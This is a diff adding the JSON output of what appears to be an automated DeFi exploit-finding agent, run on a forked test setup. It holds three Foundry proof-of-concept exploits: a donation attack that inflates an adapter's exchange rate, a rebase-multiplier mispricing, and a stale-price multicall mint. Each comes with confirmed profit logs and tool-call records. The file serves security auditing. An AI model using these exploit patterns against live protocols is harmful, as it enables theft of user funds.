@@ -1,0 +1,166 @@
+{
+  "agent": "fallback",
+  "found": true,
+  "confirmed_count": 2,
+  "finding_count": 3,
+  "headline": "EXPLOIT FOUND: $46,000 unbacked (adapter_donation / Vuln A)",
+  "patterns": [
+    {
+      "name": "adapter_donation",
+      "vuln_ref": "Vuln A",
+      "reference_incident": "Edel Finance, July 2026, $403K loss",
+      "target": "goldAdapter",
+      "preconditions_met": true,
+      "attempted": true,
+      "result": "EXPLOIT_CONFIRMED",
+      "impact_usd": 46000.00000000001,
+      "rate_before": 1000000000000000000,
+      "rate_after": 24000000000000000000,
+      "attempts": 1,
+      "poc_solidity": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"./Setup.t.sol\";\n\ncontract _AgentExploit_51749789fe is Setup {\n    function testExploit() public {\n        address atk = makeAddr(\"rq_atk_a\");\n        goldToken.mint(atk, 231_000e18);                 // flash-loan stand-in (plan: mint collateral on fork)\n        vm.startPrank(atk);\n        uint256 rateBefore = goldAdapter.exchangeRate();\n        uint256 fairPrice = priceRouter.getPrice(address(goldAdapter)).price;\n        goldToken.transfer(goldPool, 230_000e18);        // donation: inflates rate without minting shares\n        uint256 rateAfter = goldAdapter.exchangeRate();\n        goldToken.approve(address(goldAdapter), 1e18);\n        accountManager.deposit(address(goldAdapter), 1e18);   // 1 gold captured at the inflated rate\n        uint256 minted = ledger.principal(atk);\n        accountManager.mint(minted);\n        vm.stopPrank();\n        uint256 fairCollateralValue = 1e18 * fairPrice / 1e18;\n        uint256 unbacked = token.balanceOf(atk) - fairCollateralValue;\n        console2.log(\"rateBefore\", rateBefore);\n        console2.log(\"rateAfter\", rateAfter);\n        console2.log(\"minted\", minted);\n        console2.log(\"PROFIT_USD\", unbacked);\n        require(rateAfter > rateBefore * 10, \"rate not >10x\");\n        require(token.balanceOf(atk) > fairCollateralValue * 10, \"no material unbacked mint\");\n    }\n\n}\n",
+      "logs": [
+        "rateBefore 1000000000000000000",
+        "rateAfter 24000000000000000000",
+        "minted 48000000000000000000000",
+        "PROFIT_USD 46000000000000000000000"
+      ]
+    },
+    {
+      "name": "unit_composition_error",
+      "vuln_ref": "Vuln B",
+      "reference_incident": "cbETH misconfig, Feb 2026, $1.78M loss",
+      "target": "xstockAdapter",
+      "preconditions_met": true,
+      "attempted": true,
+      "result": "MISPRICING_FINDING",
+      "impact_usd": 950000.0,
+      "rate_before": null,
+      "rate_after": null,
+      "attempts": 1,
+      "poc_solidity": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"./Setup.t.sol\";\n\ncontract _AgentExploit_e2fdfe6156 is Setup {\n    function testExploit() public {\n        address usr = makeAddr(\"rq_usr_b\");\n        vm.prank(admin);\n        xstockAdapter.applyCorporateAction(1.5e18);      // legitimate corporate action: position now 1.5x\n        stockToken.mint(usr, 10_000e18);\n        vm.startPrank(usr);\n        stockToken.approve(address(xstockAdapter), 10_000e18);\n        accountManager.deposit(address(xstockAdapter), 10_000e18);\n        uint256 recorded = ledger.principal(usr);\n        vm.stopPrank();\n        uint256 rawFeed = stockUsdFeed.latestPrice();\n        uint256 trueValue = (10_000e18 * rawFeed / 1e18) * xstockAdapter.rebaseMultiplier() / 1e18;\n        uint256 gap = trueValue > recorded ? trueValue - recorded : recorded - trueValue;\n        console2.log(\"recorded\", recorded);\n        console2.log(\"trueValue\", trueValue);\n        console2.log(\"PROFIT_USD\", gap);\n        require(gap > 0, \"no mispricing\");\n    }\n\n}\n",
+      "logs": [
+        "recorded 1900000000000000000000000",
+        "trueValue 2850000000000000000000000",
+        "PROFIT_USD 950000000000000000000000"
+      ]
+    },
+    {
+      "name": "stale_price_multicall",
+      "vuln_ref": "Vuln C",
+      "reference_incident": "Generic stale-read pattern (RWA multicall class)",
+      "target": "goldAdapter",
+      "preconditions_met": true,
+      "attempted": true,
+      "result": "EXPLOIT_CONFIRMED",
+      "impact_usd": 46000.00000000001,
+      "rate_before": null,
+      "rate_after": null,
+      "attempts": 1,
+      "poc_solidity": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"./Setup.t.sol\";\n\ncontract _AgentExploit_a813ad7d88 is Setup {\n    function testExploit() public {\n        address atk = makeAddr(\"rq_atk_c\");\n        goldToken.mint(atk, 231_000e18);\n        vm.startPrank(atk);\n        uint256 fairPrice = priceRouter.getPrice(address(goldAdapter)).price;\n        goldToken.transfer(goldPool, 230_000e18);        // move the rate before the single price read\n        goldToken.approve(address(goldAdapter), 1e18);\n        uint256 minted = accountManager.depositAndMint(address(goldAdapter), 1e18);\n        vm.stopPrank();\n        uint256 fairCollateralValue = 1e18 * fairPrice / 1e18;\n        uint256 unbacked = minted - fairCollateralValue;\n        console2.log(\"minted\", minted);\n        console2.log(\"PROFIT_USD\", unbacked);\n        require(minted > fairCollateralValue * 10, \"multicall not exploitable\");\n    }\n\n}\n",
+      "logs": [
+        "minted 48000000000000000000000",
+        "PROFIT_USD 46000000000000000000000"
+      ]
+    }
+  ],
+  "tool_calls": [
+    {
+      "name": "decompile",
+      "input": {
+        "target": "goldAdapter"
+      },
+      "summary": "GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']",
+      "ok": true,
+      "ts": 1789815332.7711048
+    },
+    {
+      "name": "fork_and_execute",
+      "input": {
+        "pattern": "adapter_donation",
+        "attempt": 1
+      },
+      "summary": "EXPLOIT CONFIRMED (profit $46,000)",
+      "ok": true,
+      "ts": 1789815342.8880439
+    },
+    {
+      "name": "decompile",
+      "input": {
+        "target": "xstockAdapter"
+      },
+      "summary": "xStockAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived', 'has_rebase_multiplier']",
+      "ok": true,
+      "ts": 1789815342.8921933
+    },
+    {
+      "name": "decompile",
+      "input": {
+        "target": "PriceRouter"
+      },
+      "summary": "PriceRouter: 2 functions; flags=['has_getPrice', 'has_rebase_multiplier']",
+      "ok": true,
+      "ts": 1789815342.8972628
+    },
+    {
+      "name": "fork_and_execute",
+      "input": {
+        "pattern": "unit_composition_error",
+        "attempt": 1
+      },
+      "summary": "EXPLOIT CONFIRMED (profit $950,000)",
+      "ok": true,
+      "ts": 1789815351.2096028
+    },
+    {
+      "name": "decompile",
+      "input": {
+        "target": "AccountManager"
+      },
+      "summary": "AccountManager: 4 functions; flags=['has_multicall_depositAndMint']",
+      "ok": true,
+      "ts": 1789815351.2148118
+    },
+    {
+      "name": "decompile",
+      "input": {
+        "target": "goldAdapter"
+      },
+      "summary": "GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']",
+      "ok": true,
+      "ts": 1789815351.21917
+    },
+    {
+      "name": "fork_and_execute",
+      "input": {
+        "pattern": "stale_price_multicall",
+        "attempt": 1
+      },
+      "summary": "EXPLOIT CONFIRMED (profit $46,000)",
+      "ok": true,
+      "ts": 1789815359.5716605
+    }
+  ],
+  "reasoning_log": [
+    "agent=fallback | patterns=3 | budget=$2.00",
+    "=== pattern: adapter_donation (Vuln A) ===",
+    "recon goldAdapter -> GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']",
+    "preconditions met for adapter_donation",
+    "attempt 1: instantiating template for adapter_donation",
+    "adapter_donation CONFIRMED: EXPLOIT CONFIRMED (profit $46,000)",
+    "=== pattern: unit_composition_error (Vuln B) ===",
+    "recon xstockAdapter -> xStockAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived', 'has_rebase_multiplier']",
+    "recon PriceRouter -> PriceRouter: 2 functions; flags=['has_getPrice', 'has_rebase_multiplier']",
+    "preconditions met for unit_composition_error",
+    "attempt 1: instantiating template for unit_composition_error",
+    "unit_composition_error CONFIRMED: EXPLOIT CONFIRMED (profit $950,000)",
+    "=== pattern: stale_price_multicall (Vuln C) ===",
+    "recon AccountManager -> AccountManager: 4 functions; flags=['has_multicall_depositAndMint']",
+    "recon goldAdapter -> GoldAdapter: 5 functions; flags=['has_exchangeRate', 'rate_reads_pool_balance', 'price_passed_in_not_rederived']",
+    "preconditions met for stale_price_multicall",
+    "attempt 1: instantiating template for stale_price_multicall",
+    "stale_price_multicall CONFIRMED: EXPLOIT CONFIRMED (profit $46,000)"
+  ],
+  "llm_calls": 0,
+  "cost_usd": 0.0,
+  "ts": 1789815359.5717049
+}
